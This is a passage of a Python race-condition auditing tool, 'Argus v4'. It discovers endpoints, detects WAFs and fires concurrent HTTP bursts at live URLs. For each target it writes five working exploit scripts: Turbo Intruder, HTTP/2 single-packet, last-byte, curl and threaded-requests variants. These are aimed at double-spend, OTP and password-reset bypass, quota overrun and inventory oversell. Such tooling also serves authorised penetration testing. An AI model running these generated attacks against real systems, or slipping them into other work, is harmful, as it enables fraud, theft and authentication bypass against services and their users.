            f"vs sequential {seq_rate*100:.0f}% (Δ{margin*100:+.0f}%)."
        )
        cid = CHAIN_FOR_CLASS.get(candidate.race_class)
        if cid:
            candidate.chain_ids = [cid]
        # Additional chain: inventory oversell for any limit_overrun on stock
        if candidate.race_class == "limit_overrun" and "inventory" in candidate.target.lower():
            candidate.chain_ids.append("race-inventory")
    else:
        candidate.confirmed = False
        candidate.confidence = 55
        candidate.severity = Severity.LOW
        candidate.evidence = (
            f"Not confirmed: {conc_success}/{conc_total} concurrent matches, "
            f"baseline sequential {seq_success}/{seq_total}. Margin "
            f"{margin*100:+.0f}% below 20% threshold."
        )


def _severity_for(race_class: str, confirmed: bool) -> Severity:
    if not confirmed:
        return Severity.LOW
    return {
        "double_spend":     Severity.CRITICAL,
        "multistep_bypass": Severity.CRITICAL,
        "limit_overrun":    Severity.HIGH,
        "rate_bypass":      Severity.MEDIUM,
    }.get(race_class, Severity.MEDIUM)


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 1 — SURFACE DISCOVERY
# ═════════════════════════════════════════════════════════════════════════════

def discover_candidates(
    urls: list[str], race_cfg: dict,
) -> list[RaceCandidate]:
    candidates: list[RaceCandidate] = []
    seen: set[tuple] = set()

    for url in urls:
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))

        matches = _match_race_patterns(url)
        if not matches and url not in race_cfg:
            continue

        # Per-target config overrides inference
        cfg = race_cfg.get(url, {})
        method = cfg.get("method") or _infer_method(url, params)
        param = cfg.get("param") or _infer_param(params)
        body = cfg.get("body", "")
        ct = cfg.get("content_type", "application/x-www-form-urlencoded")

        for pattern, race_class, severity, description in matches or [
            ("config", "limit_overrun", "HIGH", "Configured race target"),
        ]:
            key = (url, race_class)
            if key in seen:
                continue
            seen.add(key)
            candidates.append(RaceCandidate(
                target=url,
                race_class=race_class,
                severity=Severity(severity) if isinstance(severity, str) else severity,
                confidence=60,
                description=description,
                method=method,
                param_name=param,
                body_template=body,
                content_type=ct,
                expected_outcome=_expected_outcome(race_class),
                escalation=_escalation_for_class(race_class),
                evidence=f"URL matched pattern: {pattern}",
                details={
                    "matched_pattern": pattern,
                    "inferred_method": method,
                    "inferred_param":  param,
                    "from_config":     url in race_cfg,
                },
            ))

    return candidates


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 2 — ATTACK PLANS
# ═════════════════════════════════════════════════════════════════════════════

TURBO_TEMPLATE = '''# Turbo Intruder script — generated by Argus v4
# Target: {target}
# Race class: {race_class}
# Expected: {expected}
#
# This is the SINGLE-PACKET attack via Burp's Engine.BURP2.
# Instructions:
#   1. Paste into Burp's Turbo Intruder (Extensions → Send to Turbo Intruder)
#   2. The target request below MUST be replaced with your captured request
#   3. Adjust REQUEST_COUNT (default {request_count})
#   4. Run. Multiple 2xx responses matching success-marker = race confirmed.

REQUEST_COUNT = {request_count}
SUCCESS_MARKER = "{success_marker}"

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=REQUEST_COUNT,
        engine=Engine.BURP2,
        maxRetriesPerRequest=0,
    )
    for i in range(REQUEST_COUNT):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
    if 200 <= req.status < 300 and SUCCESS_MARKER in req.response:
        print("[+] CONFIRMED SUCCESS: " + str(req.status) + " " + target.endpoint)
'''

SINGLE_PACKET_PY = '''#!/usr/bin/env python3
"""Single-packet HTTP/2 race attack — Argus v4 autogenerated.
Requires: pip install h2
Target: {target}
Race class: {race_class}
"""
import ssl, socket, time
try:
    import h2.connection as h2c, h2.config as h2cfg, h2.events as h2e
except ImportError:
    print("Install h2: pip install h2"); raise SystemExit(1)

TARGET_HOST = "{host}"
TARGET_PORT = {port}
TARGET_PATH = "{path}"
METHOD = "{method}"
BODY = {body_repr!r}
COUNT = {request_count}
SUCCESS_MARKER = "{success_marker}"

def main():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])

    raw = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=TARGET_HOST)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    conn = h2c.H2Connection(config=h2cfg.H2Configuration(client_side=True))
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    # Queue all streams
    for i in range(COUNT):
        sid = 2 * i + 1
        conn.send_headers(sid, [
            (":method", METHOD), (":authority", TARGET_HOST),
            (":scheme", "https"), (":path", TARGET_PATH),
            ("content-type", "application/x-www-form-urlencoded"),
            ("content-length", str(len(BODY))),
        ], end_stream=False)
        conn.send_data(sid, BODY.encode(), end_stream=True)

    # SINGLE PACKET
    sock.sendall(conn.data_to_send())
    print(f"[+] Sent {{COUNT}} requests in single packet")

    responses = {{}}
    sock.settimeout(15)
    deadline = time.time() + 20
    while len(responses) < COUNT and time.time() < deadline:
        try: data = sock.recv(65535)
        except socket.timeout: break
        for ev in conn.receive_data(data):
            if isinstance(ev, h2e.ResponseReceived):
                for k, v in ev.headers:
                    if k == ":status": responses.setdefault(ev.stream_id, {{"s": 0, "b": ""}})["s"] = int(v)
            elif isinstance(ev, h2e.DataReceived):
                responses.setdefault(ev.stream_id, {{"s": 0, "b": ""}})["b"] += ev.data.decode("utf-8", "replace")
        sock.sendall(conn.data_to_send())

    wins = sum(1 for r in responses.values() if 200 <= r["s"] < 300 and SUCCESS_MARKER in r["b"])
    print(f"[+] {{wins}}/{{COUNT}} matched success marker")
    for sid in sorted(responses):
        r = responses[sid]
        print(f"  stream {{sid}}: {{r['s']}} {{SUCCESS_MARKER in r['b']}}")
    print("VULNERABLE" if wins > 1 else "No race detected")

if __name__ == "__main__":
    main()
'''

LASTBYTE_SH = '''#!/bin/bash
# Last-byte sync race attack — Argus v4 autogenerated
# Target: {target}
# Fires {request_count} requests with all-but-last-byte sent first,
# then last bytes in one tight loop.
# Requires: parallel-curl or xargs -P

TARGET='{target}'
METHOD='{method}'
BODY='{body}'
COUNT={request_count}

# Simple approximation — true last-byte-sync requires the Python version
for i in $(seq 1 "$COUNT"); do
    (curl -s -o /tmp/race_$i.log -w "%{{http_code}}\\n" \\
         -X "$METHOD" -d "$BODY" "$TARGET") &
done
wait

grep -h success /tmp/race_*.log | wc -l
echo "Use the autogenerated single_packet.py or lastbyte_probe.py for precision."
'''

CURL_SH = '''#!/bin/bash
# Parallel curl race — Argus v4 autogenerated
# Target: {target}
# Fires {request_count} requests in parallel.

TARGET='{target}'
METHOD='{method}'
BODY='{body}'
COUNT={request_count}

for i in $(seq 1 "$COUNT"); do
    (curl -s -o /dev/null -w "%{{http_code}}\\n" \\
         -X "$METHOD" -d "$BODY" "$TARGET") &
done
wait | sort | uniq -c
'''

REQUESTS_PY = '''#!/usr/bin/env python3
"""Threaded requests race probe — Argus v4 autogenerated."""
import threading, time, requests
TARGET = "{target}"
COUNT = {request_count}
METHOD = "{method}"
BODY = {body_repr!r}

results = []; lock = threading.Lock()
barrier = threading.Barrier(COUNT)

def fire():
    try: barrier.wait(timeout=10)
    except threading.BrokenBarrierError: return
    try:
        r = requests.request(METHOD, TARGET, data=BODY, timeout=30,
                             verify=False, allow_redirects=False)
        with lock: results.append((r.status_code, len(r.content), r.text[:200]))
    except Exception:
        with lock: results.append((0, 0, ""))

threads = [threading.Thread(target=fire) for _ in range(COUNT)]
for t in threads: t.start()
for t in threads: t.join()

ok = sum(1 for s, _, _ in results if 200 <= s < 300)
print(f"Successes: {{ok}}/{{COUNT}}")
print("VULNERABLE" if ok > 1 else "No race detected")
'''


def write_attack_plans(candidates: list[RaceCandidate], outdir: Path) -> Path:
    plan_dir = outdir / "race_attack_plans"
    plan_dir.mkdir(parents=True, exist_ok=True)

    for i, c in enumerate(candidates, 1):
        safe = re.sub(r"[^a-zA-Z0-9]+", "_", c.target)[:60]
        prefix = f"{i:03d}_{safe}"
        parsed = urllib.parse.urlparse(c.target)
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        path = (parsed.path or "/") + (("?" + parsed.query) if parsed.query else "")
        success_marker = SUCCESS_MARKERS[0]
        body_bytes = c.body_template.encode() if c.body_template else b""

        # Turbo
        (plan_dir / f"{prefix}_turbo.py").write_text(
            TURBO_TEMPLATE.format(
                target=c.target, race_class=c.race_class,
                expected=c.expected_outcome,
                request_count=DEFAULT_PROBE_N,
                success_marker=success_marker,
            )
        )
        # Single-packet Python (best technique)
        (plan_dir / f"{prefix}_single_packet.py").write_text(
            SINGLE_PACKET_PY.format(
                target=c.target, race_class=c.race_class,
                host=host, port=port, path=path, method=c.method,
                body_repr=c.body_template,
                request_count=DEFAULT_PROBE_N,
                success_marker=success_marker,
            )
        )
        # Last-byte shell + curl
        (plan_dir / f"{prefix}_lastbyte.sh").write_text(
            LASTBYTE_SH.format(
                target=c.target, method=c.method, body=c.body_template,
                request_count=DEFAULT_PROBE_N,
            )
        )
        (plan_dir / f"{prefix}_curl.sh").write_text(
            CURL_SH.format(
                target=c.target, method=c.method, body=c.body_template,
                request_count=DEFAULT_PROBE_N,
            )
        )
        # Requests-based
        (plan_dir / f"{prefix}_requests.py").write_text(
            REQUESTS_PY.format(
                target=c.target, method=c.method,
                body_repr=c.body_template,
                request_count=DEFAULT_PROBE_N,
            )
        )

    return plan_dir


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 3 — PROBING ORCHESTRATION
# ═════════════════════════════════════════════════════════════════════════════

def probe_candidate(
    session: RateLimitedSession,
    candidate: RaceCandidate,
    headers: dict,
    mode: str,
    aggressive: bool,
    timeout: int,
    evidence_dir: Path,
) -> None:
    """Run baseline + concurrent probes; populate candidate in place."""
    # Step A: baseline variance
    log.debug(f"    baseline: {candidate.target} (n={BASELINE_N})")
    seq_success, seq_responses = measure_baseline(
        session, candidate, headers, BASELINE_N,
    )

    # Step B: learn signature
    learned_sig = learn_signature(seq_responses)

    # Step C+D: concurrent burst (multi-fidelity if aggressive)
    counts = MULTI_FIDELITY if aggressive else (DEFAULT_PROBE_N,)
    best_conc_results: list[tuple[int, str]] = []

    for count in counts:
        probe = choose_probe(session, candidate, mode, timeout)
        candidate.probe_mode = probe.name
        log.debug(f"    probing {candidate.target} n={count} via {probe.name}")

        try:
            conc_results = probe.probe(candidate, headers, count)
        except Exception as e:
            log.debug(f"    probe error: {e}")
            conc_results = [(0, "")] * count

        # Evaluate
        _evaluate(candidate, seq_success, BASELINE_N, conc_results, learned_sig)
        candidate.probe_count_used = count
        best_conc_results = conc_results

        if candidate.confirmed:
            log.debug(f"    CONFIRMED at n={count}")
            break

    # Save evidence
    if candidate.confirmed:
        _save_evidence(candidate, seq_responses, best_conc_results, evidence_dir)


def _save_evidence(
    candidate: RaceCandidate,
    seq_responses: list[tuple[int, str]],
    conc_results: list[tuple[int, str]],
    evidence_dir: Path,
) -> None:
    evidence_dir.mkdir(parents=True, exist_ok=True)
    base = evidence_dir / candidate.finding_hash[:16]
    try:
        (evidence_dir / f"{base.name}_baseline.txt").write_text(
            "\n".join(f"status={s} len={len(b)} body={b[:200]!r}"
                      for s, b in seq_responses[:5])
        )
        (evidence_dir / f"{base.name}_concurrent.txt").write_text(
            "\n".join(f"status={s} len={len(b)} body={b[:300]!r}"
                      for s, b in conc_results[:30])
        )
    except Exception as e:
        log.debug(f"evidence save failed: {e}")


# ═════════════════════════════════════════════════════════════════════════════
#  CHAINS
# ═════════════════════════════════════════════════════════════════════════════

def build_chains(candidates: list[RaceCandidate]) -> list[RaceChain]:
    chains: dict[str, list[RaceCandidate]] = {}
    NAMES = {
        "race-double-spend":   "Race → financial double-spend",
        "race-auth-bypass":    "Race → authentication bypass (OTP/pw-reset)",
        "race-limit-overrun":  "Race → single-use quota bypass",
        "race-rate-bypass":    "Race → rate limit absent (brute-force pivot)",
        "race-inventory":      "Race → inventory oversell",
    }
    for c in candidates:
        for cid in c.chain_ids:
            chains.setdefault(cid, []).append(c)

    out: list[RaceChain] = []
    for cid, cs in chains.items():
        max_sev = max(cs, key=lambda x: x.severity.rank).severity
        out.append(RaceChain(
            chain_id=cid,
            name=NAMES.get(cid, cid),
            severity=max_sev,
            steps=[c.evidence for c in cs],
            finding_hashes=[c.finding_hash for c in cs],
            evidence=cs[0].evidence if cs else "",
        ))
    return out


# ═════════════════════════════════════════════════════════════════════════════
#  DB SYNC
# ═════════════════════════════════════════════════════════════════════════════

def _self_sync(scan_id: int, candidates: list[RaceCandidate]) -> None:
    if not candidates or not DB_AVAILABLE or DB is None:
        return
    if not _cfg("SYNC_TO_DB", True) or not _cfg("BRIDGE_ENABLED", False):
        return
    if not getattr(DB, "available", False):
        return
    method = getattr(DB, "upsert_race_findings", None)
    if method is None:
        log.warning("  DB sync: db.py missing upsert_race_findings()")
        return
    try:
        result = method(scan_id, [c.to_dict() for c in candidates])
        if result is not None:
            log.info(f"  DB sync: {result} race finding(s) upserted (scan_id={scan_id})")
    except Exception as e:
        log.warning(f"  DB sync: exception — {e}")


# ═════════════════════════════════════════════════════════════════════════════
#  PUBLIC ENTRY POINT
# ═════════════════════════════════════════════════════════════════════════════

def run_race_audit(
    urls_file: Path,
    outdir: Path,
    *,
    headers: Optional[dict] = None,
    run_probe: bool = True,
    probe_mode: str = "auto",       # auto | requests | lastbyte | singlepacket
    aggressive: bool = False,
    max_probes: int = MAX_PROBES,
    rate_limit: Optional[int] = None,
    concurrency: Optional[int] = None,
    proxies: Optional[list[str]] = None,
    scan_id: Optional[int] = None,
) -> Path:
    start = time.monotonic()

    settings = _race_settings()
    eff_rate = rate_limit if rate_limit is not None else settings["rate_limit"]
    eff_conc = concurrency if concurrency is not None else settings["concurrency"]
    eff_timeout = settings["timeout"]
    eff_proxies = proxies if proxies is not None else list(settings["proxies"])

    urls = _load_urls(urls_file)
    outdir.mkdir(parents=True, exist_ok=True)
    evidence_dir = outdir / "race_evidence"

    cfg_hdrs = _target_headers()
    if headers:
        for k, v in headers.items():
            cfg_hdrs.setdefault(k, v)
    auth_on = bool(cfg_hdrs)

    log.info(f"  Input  : {len(urls)} URL(s) from {urls_file.name}")
    log.info(f"  Config : rate_limit={eff_rate}/s  concurrency={eff_conc}  "
             f"timeout={eff_timeout}s")
    log.info(f"  Mode   : {probe_mode}"
             f"{' (h2 available)' if H2_AVAILABLE else ' (h2 not installed)'}")
    log.info(f"  Probe  : {'ON' if run_probe else 'OFF (discovery + plans only)'}"
             f"{'  aggressive' if aggressive else ''}")
    log.info(f"  Auth   : {'yes' if auth_on else 'no'}")
    if eff_proxies:
        log.info(f"  Proxies: {len(eff_proxies)} (used for baseline only)")
    log.info("")

    if not urls:
        log.warning("  No URLs — writing empty report")
        return _write_empty(outdir, urls_file, start)

    session = RateLimitedSession(rate_limit=eff_rate, timeout=eff_timeout)
    race_cfg = _load_race_config(outdir)

    # ── Phase 0: WAF detection (sample first 5 hosts) ──────────────────────
    log.info("  Phase 0 — WAF detection")
    waf_by_host: dict[str, WAFReport] = {}
    seen_hosts: set[str] = set()
    for url in urls[:50]:
        host = urllib.parse.urlparse(url).hostname or ""
        if host in seen_hosts:
            continue
        seen_hosts.add(host)
        waf = detect_waf(session, url)
        waf_by_host[host] = waf
        if waf.vendor != "unknown":
            log.info(f"    {host:<40} WAF: {waf.vendor} ({waf.confidence}%)")

    # ── Phase 1: Discovery ─────────────────────────────────────────────────
    log.info("")
    log.info("  Phase 1 — Race surface discovery")
    candidates = discover_candidates(urls, race_cfg)
    log.info(f"    {len(candidates)} candidate(s) identified")
    if race_cfg:
        from_cfg = sum(1 for c in candidates if c.details.get("from_config"))
        log.info(f"    {from_cfg} from race_config.json")

    if not candidates:
        log.warning("  No candidates — writing empty report")
        return _write_empty(outdir, urls_file, start, total_input=len(urls))

    # ── Phase 2: Attack plans ──────────────────────────────────────────────
    log.info("")
    log.info("  Phase 2 — Generating 5 exploit scripts per candidate")
    plan_dir = write_attack_plans(candidates, outdir)
    log.info(f"    {len(candidates)} × 5 = {len(candidates) * 5} scripts → {plan_dir.name}/")

    # ── Phase 3: Probing ───────────────────────────────────────────────────
    if run_probe:
        log.info("")
        log.info(f"  Phase 3 — Baseline + concurrent probe "
                 f"(baseline n={BASELINE_N}, probe n={MULTI_FIDELITY if aggressive else DEFAULT_PROBE_N})")
        log.info(f"           Probe mode: {probe_mode}")

        probe_targets = sorted(
            candidates, key=lambda c: c.severity.rank, reverse=True,
        )[:max_probes]

        def _probe_one(c: RaceCandidate) -> None:
            host = urllib.parse.urlparse(c.target).hostname or ""
            c.waf_vendor = waf_by_host.get(host, WAFReport()).vendor
            try:
                probe_candidate(
                    session, c, cfg_hdrs, probe_mode, aggressive,
                    eff_timeout, evidence_dir,
                )
            except Exception as e:
                log.debug(f"    probe error on {c.target}: {e}")

        with ThreadPoolExecutor(max_workers=eff_conc) as pool:
            futures = {pool.submit(_probe_one, c): c for c in probe_targets}
            done = 0
            for fut in as_completed(futures):
                done += 1
                c = futures[fut]
                status = "CONFIRMED" if c.confirmed else (
                    f"{c.conc_success or 0}/{c.conc_total or 0} "
                    f"(seq {c.seq_success or 0}/{c.seq_total or 0})"
                )
                if done % 3 == 0 or c.confirmed:
                    log.info(f"    [{done:>3}/{len(probe_targets)}] "
                             f"{c.race_class:<18} {c.target[:40]:<40} {status}")

        confirmed_count = sum(1 for c in candidates if c.confirmed)
        log.info(f"    {confirmed_count}/{len(probe_targets)} confirmed vulnerable")

    # ── Phase 4: Chains ────────────────────────────────────────────────────
    log.info("")
    log.info("  Phase 4 — Chain aggregation")
    chains = build_chains(candidates)
    log.info(f"    {len(chains)} chain(s)")

    # ── Dedupe + sort ──────────────────────────────────────────────────────
    seen: set[tuple] = set()
    deduped: list[RaceCandidate] = []
    for c in candidates:
        key = (c.target, c.race_class)
        if key not in seen:
            seen.add(key)
            deduped.append(c)
    deduped.sort(key=lambda c: (
        -c.severity.rank,
        0 if c.confirmed else 1,
        -c.confidence,
        c.target,
    ))

    for c in deduped:
        c.auth_enabled = auth_on
        if not c.first_seen:
            c.first_seen = _db_now()

    # ── Reports ────────────────────────────────────────────────────────────
    elapsed = time.monotonic() - start
    by_sev: dict[str, int] = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    by_class: dict[str, int] = {}
    confirmed_list: list[RaceCandidate] = []
    for c in deduped:
        by_sev[c.severity.value] = by_sev.get(c.severity.value, 0) + 1
        by_class[c.race_class] = by_class.get(c.race_class, 0) + 1
        if c.confirmed:
            confirmed_list.append(c)

    # race_findings.json
    json_path = outdir / "race_findings.json"
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(elapsed, 2),
        "input_file": str(urls_file),
        "auth_enabled": auth_on,
        "config": {
            "probe_enabled":  run_probe,
            "probe_mode":     probe_mode,
            "h2_available":   H2_AVAILABLE,
            "baseline_n":     BASELINE_N,
            "probe_counts":   list(MULTI_FIDELITY) if aggressive else [DEFAULT_PROBE_N],
            "rate_limit":     eff_rate,
            "concurrency":    eff_conc,
            "timeout":        eff_timeout,
            "proxies":        len(eff_proxies),
        },
        "totals": {
            "urls_input":    len(urls),
            "candidates":    len(deduped),
            "confirmed":     len(confirmed_list),
            "critical":      by_sev["CRITICAL"],
            "high":          by_sev["HIGH"],
            "medium":        by_sev["MEDIUM"],
            "low":           by_sev["LOW"],
            "info":          by_sev["INFO"],
        },
        "summary": {
            "by_severity": by_sev,
            "by_class":    dict(sorted(by_class.items(), key=lambda kv: -kv[1])),
        },
        "candidates": [c.to_dict() for c in deduped],
    }
    json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")

    # race_confirmed.json — HIGH+ only
    confirmed_high = [c for c in deduped if c.severity.rank >= Severity.HIGH.rank]
    (outdir / "race_confirmed.json").write_text(
        json.dumps({
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "input_file": str(urls_file),
            "totals": {
                "confirmed": len(confirmed_high),
                "critical":  sum(1 for c in confirmed_high if c.severity == Severity.CRITICAL),
                "high":      sum(1 for c in confirmed_high if c.severity == Severity.HIGH),
                "by_chain":  {
                    cid: sum(1 for c in confirmed_high if cid in c.chain_ids)
                    for cid in {x for c in confirmed_high for x in c.chain_ids}
                },
            },
            "candidates": [c.to_dict() for c in confirmed_high],
        }, indent=2, ensure_ascii=False) + "\n"
    )

    # race_chains.json
    (outdir / "race_chains.json").write_text(
        json.dumps({
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "chains": [c.to_dict() for c in chains],
        }, indent=2, ensure_ascii=False) + "\n"
    )

    # Flat files
    (outdir / "race_candidates.txt").write_text(
        "\n".join(
            f"{c.target}\t{c.race_class}\t{c.severity.value}\t{c.confidence}\t"
            f"{'CONFIRMED' if c.confirmed else 'candidate'}\t{c.evidence[:160]}"
            for c in deduped
        ) + ("\n" if deduped else "")
    )
    probed = [c for c in deduped if c.conc_total]
    if probed:
        (outdir / "race_probe_results.txt").write_text(
            "\n".join(
                f"{c.target}\t{c.race_class}\t"
                f"seq={c.seq_success}/{c.seq_total} "
                f"conc={c.conc_success}/{c.conc_total}\t"
                f"mode={c.probe_mode}\t"
                f"{'CONFIRMED' if c.confirmed else 'not-confirmed'}\t"
                f"{c.evidence[:160]}"
                for c in probed
            ) + "\n"
        )

    # DB sync
    if scan_id is not None:
        log.info("")
        log.info(f"  Syncing to remote database (scan_id={scan_id})...")
        _self_sync(scan_id, deduped)

    # Console summary
    log.info("")
    log.info("  Outputs :")
    log.info(f"    race_findings.json           {len(deduped):>5} candidate(s)")
    log.info(f"    race_confirmed.json          {len(confirmed_high):>5} confirmed (HIGH+)")
    log.info(f"    race_chains.json             {len(chains):>5} chain(s)")
    log.info(f"    race_candidates.txt          {len(deduped):>5} candidate(s)")
    log.info(f"    race_attack_plans/           {len(candidates) * 5:>5} script(s)")
    if probed:
        log.info(f"    race_probe_results.txt       {len(probed):>5} probe result(s)")
    if confirmed_high:
        log.info(f"    race_evidence/               {len(confirmed_high):>5} evidence pair(s)")
    log.info("")
    log.info(f"  Severity : CRITICAL={by_sev['CRITICAL']}  HIGH={by_sev['HIGH']}  "
             f"MEDIUM={by_sev['MEDIUM']}  LOW={by_sev['LOW']}  INFO={by_sev['INFO']}")
    log.info(f"  Confirmed: {len(confirmed_list)}/{len(deduped)}")
    if chains:
        log.info("  Chains   : " + " · ".join(
            f"{c.chain_id}({c.severity.value})" for c in chains
        ))
    if confirmed_high:
        log.info("")
        log.info("  Confirmed races:")
        for c in confirmed_high[:10]:
            tag = f" [{','.join(c.chain_ids)}]" if c.chain_ids else ""
            log.info(f"    [{c.severity.value:<8}] {c.race_class:<18} "
                     f"{c.target[:55]}{tag}")
    log.info("")
    log.info(f"  Completed in {elapsed:.1f}s")
    return json_path


def _write_empty(
    outdir: Path, input_file: Path, start: float, total_input: int = 0,
) -> Path:
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(time.monotonic() - start, 2),
        "input_file": str(input_file),
        "auth_enabled": False,
        "config": {},
        "totals": {
            "urls_input": total_input, "candidates": 0, "confirmed": 0,
            "critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0,
        },
        "summary": {"by_severity": {}, "by_class": {}},
        "candidates": [],
    }
    path = outdir / "race_findings.json"
    path.write_text(json.dumps(report, indent=2) + "\n")
    (outdir / "race_confirmed.json").write_text(json.dumps({
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "input_file": str(input_file),
        "totals": {"confirmed": 0, "critical": 0, "high": 0, "by_chain": {}},
        "candidates": [],
    }, indent=2) + "\n")
    (outdir / "race_chains.json").write_text(json.dumps({
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "chains": [],
    }, indent=2) + "\n")
    for name in ("race_candidates.txt", "race_probe_results.txt"):
        (outdir / name).write_text("")
    (outdir / "race_attack_plans").mkdir(exist_ok=True)
    (outdir / "race_evidence").mkdir(exist_ok=True)
    return path


# ═════════════════════════════════════════════════════════════════════════════
#  STANDALONE
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="%(message)s",
        handlers=[logging.StreamHandler(sys.stdout)],
    )
    base = Path(__file__).resolve().parent.parent
    default_input = base / "output" / "urls_with_params.txt"
    if not default_input.exists():
        default_input = base / "output" / "live_urls.txt"

    parser = argparse.ArgumentParser(description="Argus Race Condition Auditor v4")
    parser.add_argument("--input", type=Path, default=default_input)
    parser.add_argument("--output", type=Path, default=base / "output")
    parser.add_argument("--scan-id", type=int, default=None)
    parser.add_argument("--rate-limit", type=int, default=None)
    parser.add_argument("--concurrency", type=int, default=None)
    parser.add_argument("--proxies", default=None)
    parser.add_argument("--cookie", help="Session cookie for authenticated testing")
    parser.add_argument(
        "--probe-mode",
        choices=["auto", "requests", "lastbyte", "singlepacket"],
        default="auto",
        help="Concurrency technique (default: auto)",
    )
    parser.add_argument("--aggressive", action="store_true",
                        help="Multi-fidelity probing (n=5,10,20,50)")
    parser.add_argument("--no-probe", action="store_true",
                        help="Discovery + attack plans only")
    args = parser.parse_args()

    hdrs = {"Cookie": args.cookie} if args.cookie else None
    proxies = args.proxies.split(",") if args.proxies else None

    try:
        run_race_audit(
            args.input, args.output,
            headers=hdrs,
            run_probe=not args.no_probe,
            probe_mode=args.probe_mode,
            aggressive=args.aggressive,
            rate_limit=args.rate_limit,
            concurrency=args.concurrency,
            proxies=proxies,
            scan_id=args.scan_id,
        )
    except Exception as e:
        log.error(f"failed: {e}")
        import traceback
        log.debug(traceback.format_exc())
        sys.exit(1)
